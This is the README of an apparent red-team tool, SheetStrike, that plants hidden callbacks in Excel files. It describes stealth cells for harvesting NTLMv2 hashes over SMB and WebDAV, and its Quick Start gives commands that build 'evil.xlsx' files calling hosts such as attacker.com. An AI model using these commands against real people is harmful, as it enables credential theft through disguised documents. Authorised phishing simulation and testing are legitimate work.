# ⚡ SheetStrike

Weaponize Excel files for red team operations and security assessments.

## Features

- **HTTP Canary** - Track document opens with stealth callbacks
- **SMB Hash Capture** - Harvest NTLMv2 hashes via UNC paths (LAN)
- **WebDAV Hash Capture** - Harvest hashes over HTTP/HTTPS (bypasses port 445 filtering)
- **Stealth Injection** - Payloads hidden in unreachable cells with legitimate-looking resource names

## Quick Start
```bash
# HTTP tracking
python3 sheetstrike.py -i clean.xlsx -o tracked.xlsx -m http -H yourserver.com

# SMB hash capture
python3 sheetstrike.py -i clean.xlsx -o evil.xlsx -m smb -H 192.168.1.100

# WebDAV (remote hash capture)
python3 sheetstrike.py -i clean.xlsx -o evil.xlsx -m webdav -H attacker.com --https
```

## Use Cases

- Red team engagements
- Phishing simulations
- Security awareness testing
- Detecting document leaks

⚠️ **For authorized security testing only**
```
